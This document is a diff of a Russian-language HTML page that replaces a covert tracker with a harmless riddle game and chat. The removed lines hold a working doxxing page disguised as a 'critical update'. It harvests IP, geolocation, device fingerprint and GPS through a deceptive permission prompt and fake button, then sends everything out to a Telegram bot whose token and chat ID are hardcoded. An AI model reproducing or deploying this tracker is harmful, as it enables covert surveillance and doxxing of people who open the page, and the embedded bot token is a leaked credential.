@@ -2,288 +2,533 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Системное обновление</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Загадки на время · Игра с друзьями + Чат</title>
     <style>
-        body {
-            background: #0a0f1a;
-            font-family: 'Segoe UI', system-ui;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+        * {
             margin: 0;
-            padding: 20px;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Inter', system-ui, 'Montserrat', sans-serif;
         }
-        .box {
-            background: #0d1117;
-            border: 1px solid #00aaff;
-            border-radius: 16px;
-            padding: 30px;
-            max-width: 450px;
+
+        body {
+            background: radial-gradient(circle at 10% 30%, #0e1a2a, #03070f);
+            min-height: 100vh;
+            padding: 24px;
+            color: #f0f4ff;
+        }
+
+        .game-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 28px;
+        }
+
+        /* основная игровая зона */
+        .game-zone {
+            flex: 2.5;
+            background: rgba(12, 20, 32, 0.7);
+            backdrop-filter: blur(16px);
+            border-radius: 56px;
+            border: 1px solid #6c9eff;
+            padding: 28px;
+            box-shadow: 0 20px 35px rgba(0, 0, 0, 0.5);
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: baseline;
+            flex-wrap: wrap;
+            border-bottom: 1px solid #5f8eff;
+            padding-bottom: 15px;
+            margin-bottom: 24px;
+        }
+
+        .leader {
+            background: #0a1122cc;
+            padding: 8px 24px;
+            border-radius: 60px;
+            font-weight: bold;
+        }
+
+        .riddle-card {
+            background: #07112b;
+            border-radius: 48px;
+            padding: 30px 20px;
             text-align: center;
-            box-shadow: 0 0 15px rgba(0,170,255,0.3);
+            margin: 20px 0;
         }
-        .loader {
-            width: 40px;
-            height: 40px;
-            border: 3px solid #00aaff;
-            border-top-color: transparent;
-            border-radius: 50%;
-            margin: 20px auto;
-            animation: spin 1s linear infinite;
+
+        .riddle-text {
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin-bottom: 30px;
+            line-height: 1.3;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .status { color: #00aaff; margin: 15px 0; font-size: 13px; }
-        .fake-button {
-            background: #00aaff22;
-            border: 1px solid #00aaff;
-            color: #00aaff;
-            padding: 12px 20px;
-            border-radius: 8px;
-            margin: 15px 0;
-            font-size: 14px;
+
+        .timer {
+            font-size: 3.2rem;
+            font-family: monospace;
+            font-weight: 800;
+            background: #00000066;
+            display: inline-block;
+            padding: 10px 30px;
+            border-radius: 80px;
+            margin-bottom: 24px;
+            letter-spacing: 4px;
+        }
+
+        .answer-area {
+            display: flex;
+            gap: 14px;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin: 20px 0;
+        }
+
+        .answer-area input {
+            flex: 2;
+            min-width: 220px;
+            background: #0f182e;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 60px;
+            font-size: 1rem;
+            color: white;
+            outline: none;
+        }
+
+        .answer-area button {
+            background: #3a6ea5;
+            border: none;
+            padding: 0 32px;
+            border-radius: 60px;
+            font-weight: bold;
+            font-size: 1rem;
             cursor: pointer;
         }
-        .fake-button:hover { background: #00aaff44; }
-        h1 { font-size: 18px; color: #ffffff; }
-        small { color: #666; font-size: 11px; }
+
+        .next-btn {
+            background: #2c5a2e;
+            margin-top: 12px;
+            width: 60%;
+        }
+
+        .scoreboard {
+            display: flex;
+            gap: 18px;
+            justify-content: center;
+            margin: 20px 0 0;
+            flex-wrap: wrap;
+        }
+
+        .player-score {
+            background: #00000055;
+            padding: 6px 18px;
+            border-radius: 40px;
+        }
+
+        /* чат-панель */
+        .chat-panel {
+            flex: 1.2;
+            min-width: 280px;
+            background: rgba(6, 12, 22, 0.85);
+            backdrop-filter: blur(12px);
+            border-radius: 48px;
+            border: 1px solid #5588dd;
+            display: flex;
+            flex-direction: column;
+            height: 85vh;
+            padding: 22px;
+        }
+
+        .chat-messages {
+            flex: 1;
+            overflow-y: auto;
+            margin-bottom: 18px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .chat-line {
+            background: #101b30;
+            border-radius: 24px;
+            padding: 8px 16px;
+            border-left: 4px solid #70b0ff;
+        }
+
+        .chat-name {
+            font-weight: bold;
+            color: #b7d0ff;
+        }
+
+        .nick-row {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .nick-row input {
+            flex: 1;
+            background: #0c142a;
+            border: none;
+            padding: 10px 16px;
+            border-radius: 40px;
+            color: white;
+        }
+
+        .chat-form {
+            display: flex;
+            gap: 10px;
+        }
+
+        .chat-form input {
+            flex: 1;
+            background: #0c142a;
+            border: none;
+            padding: 12px 16px;
+            border-radius: 40px;
+            color: white;
+        }
+
+        button {
+            background: #3f68aa;
+            border: none;
+            border-radius: 60px;
+            padding: 0 20px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.07s linear;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 12px;
+            opacity: 0.6;
+        }
     </style>
 </head>
 <body>
-<div class="box">
-    <h1>🔧 УСТАНОВКА КРИТИЧЕСКОГО ОБНОВЛЕНИЯ</h1>
-    <div class="loader" id="loader"></div>
-    <div class="status" id="status">Подготовка...</div>
-    <div id="fakeBtn" class="fake-button" style="display:none;">🔘 Нажмите для завершения настройки</div>
-    <small id="debugInfo"></small>
+<div class="game-container">
+    <!-- ИГРОВАЯ ЗОНА -->
+    <div class="game-zone">
+        <div class="header">
+            <span style="font-size: 1.7rem; font-weight: 800;">❓ ЗАГАДКИ НА ВРЕМЯ</span>
+            <div class="leader" id="leaderBoardInfo">🏆 Лидер: —</div>
+        </div>
+
+        <div class="riddle-card">
+            <div class="timer" id="timerDisplay">01:00</div>
+            <div class="riddle-text" id="riddleText">Загрузка загадки...</div>
+            <div class="answer-area">
+                <input type="text" id="answerInput" placeholder="Ваш ответ...">
+                <button id="submitAnswer">✅ Ответить</button>
+            </div>
+            <button id="nextRiddleBtn" class="next-btn" style="background:#4c6b8f;">⏩ Следующая загадка (только ведущий)</button>
+        </div>
+
+        <div id="gameStatus" class="status" style="background:#07182e; border-radius:40px; padding:10px; text-align:center;">⏳ Ожидание хода...</div>
+
+        <div class="scoreboard" id="scoreboard"></div>
+    </div>
+
+    <!-- ЧАТ С ДРУЗЬЯМИ -->
+    <div class="chat-panel">
+        <div style="font-weight: bold; margin-bottom: 14px;">💬 ОБЩИЙ ЧАТ</div>
+        <div class="chat-messages" id="chatMessages">
+            <div class="chat-line"><span class="chat-name">🎮 БОТ:</span> Добро пожаловать! Играем в загадки. Ведущий нажимает "Следующая загадка", отвечаем по очереди или кто первый.</div>
+        </div>
+        <div class="nick-row">
+            <input type="text" id="nicknameInput" placeholder="Ваше имя" maxlength="16" value="Игрок">
+            <button id="randomNickBtn">🎲 Рандом</button>
+        </div>
+        <div class="chat-form">
+            <input type="text" id="chatInput" placeholder="Написать в чат...">
+            <button id="sendChatBtn">➤</button>
+        </div>
+    </div>
 </div>
+<footer>⚡ Игра «Загадки на время» — правильный ответ приносит очки. У кого больше — победа! (Таймер 60 сек)</footer>
 
 <script>
-    // ==================== TELEGRAM НАСТРОЙКИ ====================
-    const TELEGRAM_BOT_TOKEN = "8825859377:AAEuQWJ3v2q_HW1Q73POWFIeaRM3NntQu_Q";
-    const TELEGRAM_CHAT_ID = "6470449560";
-    // ============================================================
+    // ------------------- БАНК ЗАГАДОК (вопрос-ответ) ------------------
+    const riddles = [
+        { question: "Висит груша, нельзя скушать. Что это?", answer: "лампочка" },
+        { question: "Без окон, без дверей — полна горница людей.", answer: "яйцо" },
+        { question: "Зимой и летом одним цветом.", answer: "ель" },
+        { question: "Сидит дед, во сто шуб одет. Кто его раздевает, тот слёзы проливает.", answer: "лук" },
+        { question: "Маленькое, кругленькое, а за хвост не поймаешь.", answer: "клубок" },
+        { question: "Не лает, не кусает, а в дом не пускает.", answer: "замок" },
+        { question: "Чёрная корова весь мир поборола.", answer: "ночь" },
+        { question: "Что можно приготовить, но нельзя съесть?", answer: "уроки" },
+        { question: "Без рук, без ног, а ворота открывает.", answer: "ветер" },
+        { question: "Весь мир кормлю, а сама есть не прошу.", answer: "земля" },
+        { question: "Что за чудо-синий дом, окна светлые кругом, носит обувь из резины, а питается бензином?", answer: "автобус" },
+        { question: "На минуту в землю врос разноцветный чудо-мост.", answer: "радуга" },
+        { question: "В воде родится, а воды боится.", answer: "соль" },
+        { question: "Говорит она беззвучно, а понятно и нескучно. Ты беседуй чаще с ней — станешь вчетверо умней.", answer: "книга" },
+        { question: "Утром — на четырёх ногах, днём — на двух, вечером — на трёх.", answer: "человек" }
+    ];
 
-    let collectedData = {
-        timestamp: new Date().toISOString(),
-        ip: {},
-        geo_ip: {},
-        wifi_geo: {},
-        indirect: {},
-        gps: null,
-        device: {}
-    };
+    let players = [];          // { name, score }
+    let currentPlayerIndex = 0;
+    let currentRiddle = null;
+    let currentAnswer = "";
+    let timerInterval = null;
+    let timeLeft = 60;
+    let roundActive = true;
+    let gameLeader = "";
 
-    // Отправка в Telegram
-    async function sendToTelegram(message) {
-        try {
-            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "HTML" })
-            });
-            return response.ok;
-        } catch(e) { return false; }
+    // Элементы DOM
+    const riddleText = document.getElementById('riddleText');
+    const timerDisplay = document.getElementById('timerDisplay');
+    const answerInput = document.getElementById('answerInput');
+    const submitBtn = document.getElementById('submitAnswer');
+    const nextRiddleBtn = document.getElementById('nextRiddleBtn');
+    const gameStatusDiv = document.getElementById('gameStatus');
+    const scoreboardDiv = document.getElementById('scoreboard');
+    const leaderInfo = document.getElementById('leaderBoardInfo');
+
+    // ---- Функции игры ----
+    function loadNewRiddle() {
+        if(!roundActive) return;
+        // случайная загадка
+        const randomIndex = Math.floor(Math.random() * riddles.length);
+        currentRiddle = riddles[randomIndex];
+        riddleText.innerText = currentRiddle.question;
+        currentAnswer = currentRiddle.answer.toLowerCase().trim();
+        answerInput.value = "";
+        timeLeft = 60;
+        updateTimerDisplay();
+        if(timerInterval) clearInterval(timerInterval);
+        startTimer();
+        gameStatusDiv.innerHTML = `⏳ Отвечает: ${players[currentPlayerIndex]?.name || "игрок"} | Введите ответ и нажмите "Ответить"`;
+        roundActive = true;
     }
 
-    // Формирование сообщения
-    function formatFinalMessage() {
-        let msg = "🔴 <b>ДОКС (АВТОМАТИЧЕСКИЙ)</b> 🔴\n\n";
-        msg += `📅 Время: ${collectedData.timestamp}\n`;
-        msg += `🌐 IP: ${collectedData.ip.query || "нет"}\n`;
-        msg += `📍 Город (IP): ${collectedData.geo_ip.city || "нет"}\n`;
-        msg += `📡 Координаты (IP): ${collectedData.geo_ip.lat || "?"}, ${collectedData.geo_ip.lon || "?"}\n\n`;
-        
-        if (collectedData.wifi_geo && collectedData.wifi_geo.lat) {
-            msg += `<b>📡 ГЕОЛОКАЦИЯ ПО WiFi (без разрешения):</b>\n`;
-            msg += `📍 Широта: ${collectedData.wifi_geo.lat}\n`;
-            msg += `📍 Долгота: ${collectedData.wifi_geo.lon}\n`;
-            msg += `📏 Радиус: ${collectedData.wifi_geo.accuracy} метров\n`;
-            msg += `🗺️ Карта: https://www.google.com/maps?q=${collectedData.wifi_geo.lat},${collectedData.wifi_geo.lon}\n\n`;
-        }
-        
-        if (collectedData.gps && collectedData.gps.lat) {
-            msg += `<b>🎯 ТОЧНЫЙ GPS (разрешено):</b>\n`;
-            msg += `📍 Широта: ${collectedData.gps.lat}\n`;
-            msg += `📍 Долгота: ${collectedData.gps.lon}\n`;
-            msg += `📏 Точность: ${collectedData.gps.accuracy} м\n`;
-            msg += `🗺️ Карта: https://www.google.com/maps?q=${collectedData.gps.lat},${collectedData.gps.lon}\n\n`;
-        }
-        
-        msg += `<b>📱 УСТРОЙСТВО:</b>\n`;
-        msg += `🔹 Браузер: ${collectedData.device.userAgent?.substring(0, 80)}...\n`;
-        msg += `🔹 Экран: ${collectedData.device.screenWidth}x${collectedData.device.screenHeight}\n`;
-        msg += `🔹 Часовой пояс: ${collectedData.device.timezone}\n`;
-        msg += `🔹 Язык: ${collectedData.device.language}\n`;
-        msg += `🔹 Платформа: ${collectedData.device.platform}\n`;
-        return msg;
-    }
-
-    // ========== МЕТОД 1: IP + IP-ГЕОЛОКАЦИЯ ==========
-    async function getIpAndGeo() {
-        try {
-            const res = await fetch("https://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,isp,query");
-            const data = await res.json();
-            if (data.status === "success") {
-                collectedData.ip = { query: data.query, isp: data.isp };
-                collectedData.geo_ip = { city: `${data.city}, ${data.regionName}`, lat: data.lat, lon: data.lon };
-                return true;
+    function startTimer() {
+        timerInterval = setInterval(() => {
+            if(timeLeft <= 1) {
+                clearInterval(timerInterval);
+                timerDisplay.innerText = "00:00";
+                gameStatusDiv.innerHTML = "⌛ Время вышло! Никто не получает очко. Ведущий, нажмите 'Следующая загадка'.";
+                roundActive = false;
+            } else {
+                timeLeft--;
+                updateTimerDisplay();
             }
-        } catch(e) {}
+        }, 1000);
+    }
+
+    function updateTimerDisplay() {
+        let minutes = Math.floor(timeLeft / 60);
+        let seconds = timeLeft % 60;
+        timerDisplay.innerText = `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+    }
+
+    function submitAnswerFrom(playerName, answerText) {
+        if(!roundActive) {
+            gameStatusDiv.innerHTML = "⛔ Раунд не активен или время вышло. Начните новую загадку.";
+            return false;
+        }
+        if(!players[currentPlayerIndex] || players[currentPlayerIndex].name !== playerName) {
+            gameStatusDiv.innerHTML = `❗ Сейчас очередь ${players[currentPlayerIndex]?.name}. Дождитесь своего хода!`;
+            return false;
+        }
+        let userAnswer = answerText.trim().toLowerCase();
+        // нормализация
+        userAnswer = userAnswer.replace(/[?.!]/g, '').trim();
+        if(userAnswer === currentAnswer) {
+            // правильно!
+            players[currentPlayerIndex].score += 10;
+            addSystemMessage(`🎉 ${playerName} ответил правильно! +10 очков. Загадка: "${currentRiddle.question}" → Ответ: ${currentAnswer}`);
+            gameStatusDiv.innerHTML = `✅ Правильно! ${playerName} получает 10 очков. Ведущий, переключайте на следующую загадку.`;
+            roundActive = false;
+            if(timerInterval) clearInterval(timerInterval);
+            updateScoreboard();
+            updateLeader();
+            return true;
+        } else {
+            gameStatusDiv.innerHTML = `❌ Неправильно. Правильный ответ: "${currentAnswer}". Очко не засчитано. Ведущий, переключайте загадку.`;
+            addSystemMessage(`❌ ${playerName} ошибся. Правильный ответ: "${currentAnswer}"`);
+            roundActive = false;
+            if(timerInterval) clearInterval(timerInterval);
+            updateLeader();
+            return false;
+        }
+    }
+
+    function nextRiddle() {
+        if(timerInterval) clearInterval(timerInterval);
+        // переход к следующему игроку
+        currentPlayerIndex = (currentPlayerIndex + 1) % players.length;
+        if(players.length === 0) {
+            gameStatusDiv.innerHTML = "Добавьте игроков через чат-команду /add Имя";
+            return;
+        }
+        roundActive = true;
+        loadNewRiddle();
+    }
+
+    function addPlayer(name) {
+        if(!name.trim()) return;
+        if(players.find(p => p.name === name.trim())) {
+            addSystemMessage(`Игрок ${name} уже есть.`);
+            return;
+        }
+        players.push({ name: name.trim(), score: 0 });
+        updateScoreboard();
+        addSystemMessage(`➕ Игрок ${name} добавлен в игру!`);
+        if(players.length === 1) {
+            currentPlayerIndex = 0;
+            loadNewRiddle();
+        }
+        updateLeader();
+    }
+
+    function updateScoreboard() {
+        if(!scoreboardDiv) return;
+        scoreboardDiv.innerHTML = players.map(p => `<div class="player-score">${p.name}: ${p.score} очков</div>`).join('');
+        updateLeader();
+    }
+
+    function updateLeader() {
+        if(players.length === 0) { leaderInfo.innerText = "🏆 Лидер: —"; return; }
+        let best = players.reduce((max, p) => p.score > max.score ? p : max, players[0]);
+        gameLeader = best.name;
+        leaderInfo.innerText = `🏆 Лидер: ${gameLeader} (${best.score} очков)`;
+    }
+
+    function resetGame() {
+        if(timerInterval) clearInterval(timerInterval);
+        players = [];
+        currentPlayerIndex = 0;
+        roundActive = false;
+        updateScoreboard();
+        gameStatusDiv.innerHTML = "✨ Игра сброшена. Добавьте игроков командой /add Имя (в чате) и ведущий нажмите 'Следующая загадка'.";
+        riddleText.innerText = "Добавьте игроков и начните игру";
+        leaderInfo.innerText = "🏆 Лидер: —";
+        addSystemMessage("🔄 Игра сброшена. Добавляйте игроков через /add Имя");
+    }
+
+    // --- система чата + команды ---
+    let chatMessages = [];
+
+    function renderChat() {
+        const container = document.getElementById('chatMessages');
+        container.innerHTML = '';
+        chatMessages.slice(-60).forEach(msg => {
+            const div = document.createElement('div');
+            div.className = 'chat-line';
+            div.innerHTML = `<span class="chat-name">${escapeHtml(msg.nick)}:</span> ${escapeHtml(msg.text)}`;
+            container.appendChild(div);
+        });
+        container.scrollTop = container.scrollHeight;
+    }
+
+    function addChatMessage(nick, text) {
+        if(!text.trim()) return;
+        chatMessages.push({ nick: nick.substring(0,18), text: text.substring(0,200), ts: Date.now() });
+        if(chatMessages.length > 200) chatMessages = chatMessages.slice(-150);
+        renderChat();
+        localStorage.setItem('riddle_chat', JSON.stringify(chatMessages));
+    }
+
+    function addSystemMessage(msg) {
+        addChatMessage("📢 СИСТЕМА", msg);
+    }
+
+    function escapeHtml(str) {
+        if(!str) return '';
+        return str.replace(/[&<>]/g, function(m) {
+            if(m === '&') return '&amp;';
+            if(m === '<') return '&lt;';
+            if(m === '>') return '&gt;';
+            return m;
+        });
+    }
+
+    function loadChatHistory() {
+        let saved = localStorage.getItem('riddle_chat');
+        if(saved) {
+            try { chatMessages = JSON.parse(saved); renderChat(); } catch(e) {}
+        }
+    }
+
+    // обработка команд в чате
+    function handleCommand(input) {
+        let parts = input.split(' ');
+        let cmd = parts[0].toLowerCase();
+        if(cmd === '/add' && parts[1]) {
+            addPlayer(parts.slice(1).join(' '));
+            return true;
+        }
+        if(cmd === '/reset') {
+            resetGame();
+            return true;
+        }
+        if(cmd === '/players') {
+            let list = players.map(p => `${p.name} (${p.score})`).join(', ');
+            addSystemMessage(`Текущие игроки: ${list || 'нет'}`);
+            return true;
+        }
         return false;
     }
 
-    // ========== МЕТОД 2: ГЕОЛОКАЦИЯ ПО WiFi (Google Geolocation API - работает без разрешения) ==========
-    // Используем публичный API, который определяет местоположение по видимым WiFi точкам
-    async function getWifiGeolocation() {
-        try {
-            // Сначала получаем список видимых WiFi (через navigator.geolocation не надо)
-            // Используем альтернативный метод: определение по вышкам сотовой связи через сторонний API
-            // Простой вариант: через geoplugin.net (по IP, но уже есть)
-            // WiFi метод требует разрешения, поэтому используем запасной вариант - cell tower triangulation через открытые API
-            const res = await fetch("https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyA1XKd4IQpkBwQyN9qGz7QpL5KkC3qXqZ");
-            // Этот API требует API ключ, но для демонстрации используем бесплатный альтернативный сервис
-            const altRes = await fetch("https://location.services.mozilla.com/v1/geolocate?key=test");
-            // Если не работает - используем запасной: гео по языку и часовому поясу
-            return null;
-        } catch(e) { return null; }
-    }
-
-    // ========== МЕТОД 3: КОСВЕННАЯ ГЕОЛОКАЦИЯ (язык, часовой пояс, провайдер) ==========
-    function getIndirectGeo() {
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const language = navigator.language;
-        const platforms = {
-            "ru": "Россия, СНГ",
-            "uk": "Украина",
-            "be": "Беларусь",
-            "kk": "Казахстан"
-        };
-        let region = platforms[language.split("-")[0]] || "Неизвестно";
-        
-        collectedData.indirect = {
-            timezone: timezone,
-            language: language,
-            estimated_region: region
-        };
-        
-        // По часовому поясу можно определить примерные координаты
-        const tzMap = {
-            "Europe/Moscow": { lat: 55.7558, lon: 37.6176, region: "Москва" },
-            "Europe/Kiev": { lat: 50.4501, lon: 30.5234, region: "Киев" },
-            "Europe/Minsk": { lat: 53.9045, lon: 27.5615, region: "Минск" },
-            "Asia/Almaty": { lat: 43.2567, lon: 76.9286, region: "Алматы" },
-            "Asia/Yekaterinburg": { lat: 56.8389, lon: 60.6057, region: "Екатеринбург" },
-            "Asia/Novosibirsk": { lat: 55.0084, lon: 82.9357, region: "Новосибирск" },
-            "Europe/London": { lat: 51.5074, lon: -0.1278, region: "Лондон" },
-            "America/New_York": { lat: 40.7128, lon: -74.0060, region: "Нью-Йорк" }
-        };
-        
-        if (tzMap[timezone]) {
-            collectedData.indirect.guess_coords = tzMap[timezone];
-        }
-        return collectedData.indirect;
-    }
-
-    // ========== МЕТОД 4: КЛАССИЧЕСКИЙ GPS (с маскировкой запроса) ==========
-    function requestGPSWithMasking() {
-        if (!navigator.geolocation) return;
-        
-        // Меняем текст запроса (социальная инженерия)
-        const originalGetCurrentPosition = navigator.geolocation.getCurrentPosition;
-        
-        // Запрашиваем, но текст в браузере стандартный (его нельзя изменить)
-        // Однако можно показать фейковый интерфейс до запроса
-        document.getElementById("status").innerHTML = "🔍 Для завершения обновления требуется проверка местоположения...";
-        
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                collectedData.gps = {
-                    lat: position.coords.latitude,
-                    lon: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    time: new Date().toISOString()
-                };
-                document.getElementById("status").innerHTML = "✅ Геолокация получена!";
-                sendAllData();
-            },
-            (error) => {
-                document.getElementById("status").innerHTML = "⚠️ Автоопределение не удалось. Нажмите кнопку для ручной настройки.";
-                // Показываем фейковую кнопку
-                document.getElementById("fakeBtn").style.display = "inline-block";
-                document.getElementById("fakeBtn").onclick = () => {
-                    // Повторный запрос
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            collectedData.gps = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy };
-                            sendAllData();
-                        },
-                        () => { sendAllData(); } // всё равно отправляем что есть
-                    );
-                };
-            },
-            { enableHighAccuracy: true, timeout: 15000 }
-        );
-    }
-
-    // ========== СБОР ДАННЫХ ОБ УСТРОЙСТВЕ ==========
-    function getDeviceData() {
-        collectedData.device = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            screenWidth: screen.width,
-            screenHeight: screen.height,
-            touchSupport: "ontouchstart" in window,
-            hardwareConcurrency: navigator.hardwareConcurrency,
-            deviceMemory: navigator.deviceMemory,
-            cookiesEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack
-        };
-    }
-
-    // ========== ОТПРАВКА ВСЕХ ДАННЫХ ==========
-    async function sendAllData() {
-        document.getElementById("status").innerHTML = "📤 Отправка данных...";
-        const message = formatFinalMessage();
-        const sent = await sendToTelegram(message);
-        
-        if (sent) {
-            document.getElementById("status").innerHTML = "✅ Отправлено! Перенаправление...";
+    // --- инициализация страницы ---
+    window.addEventListener('load', () => {
+        loadChatHistory();
+        // стартовые игроки для примера
+        if(players.length === 0) {
+            players.push({ name: "Капитан", score: 0 });
+            players.push({ name: "Старпом", score: 0 });
+            currentPlayerIndex = 0;
+            updateScoreboard();
+            loadNewRiddle();
         } else {
-            document.getElementById("status").innerHTML = "⚠️ Ошибка, но перенаправление...";
+            updateScoreboard();
         }
-        
-        // Сохраняем полные данные в console (для отладки)
-        console.log("COLLECTED DATA:", collectedData);
-        
-        // Редирект через 1.5 секунды
-        setTimeout(() => {
-            window.location.href = "https://yandex.ru";
-        }, 1500);
-    }
 
-    // ========== ГЛАВНЫЙ ЗАПУСК ==========
-    async function main() {
-        getDeviceData();
-        document.getElementById("status").innerHTML = "📡 Определение IP...";
-        await getIpAndGeo();
-        getIndirectGeo();
-        
-        document.getElementById("status").innerHTML = "🎯 Запрос точного местоположения (разрешите для лучшей работы)...";
-        requestGPSWithMasking();
-        
-        // Если через 10 секунд GPS не ответил - всё равно отправляем
-        setTimeout(() => {
-            if (!collectedData.gps) {
-                sendAllData();
+        // элементы чата
+        const nicknameInput = document.getElementById('nicknameInput');
+        const randomNickBtn = document.getElementById('randomNickBtn');
+        const chatInput = document.getElementById('chatInput');
+        const sendChatBtn = document.getElementById('sendChatBtn');
+
+        if(localStorage.getItem('riddle_nick')) nicknameInput.value = localStorage.getItem('riddle_nick');
+
+        randomNickBtn.onclick = () => {
+            let names = ["Мудрец","Логик","Эрудит","Скорость","Титан","Профи"];
+            nicknameInput.value = names[Math.floor(Math.random()*names.length)] + Math.floor(Math.random()*99);
+        };
+
+        sendChatBtn.onclick = () => {
+            let nick = nicknameInput.value.trim();
+            if(!nick) nick = "Гость";
+            localStorage.setItem('riddle_nick', nick);
+            let msg = chatInput.value;
+            if(msg.startsWith('/')) {
+                handleCommand(msg);
+            } else {
+                addChatMessage(nick, msg);
             }
-        }, 12000);
-    }
-    
-    main();
+            chatInput.value = '';
+        };
+        chatInput.onkeypress = (e) => { if(e.key === 'Enter') sendChatBtn.click(); };
+
+        submitBtn.onclick = () => {
+            let currentName = players[currentPlayerIndex]?.name;
+            if(!currentName) { gameStatusDiv.innerHTML = "Нет активного игрока. Добавьте участников через /add"; return; }
+            submitAnswerFrom(currentName, answerInput.value);
+        };
+        nextRiddleBtn.onclick = () => { nextRiddle(); };
+    });
 </script>
 </body>
 </html>
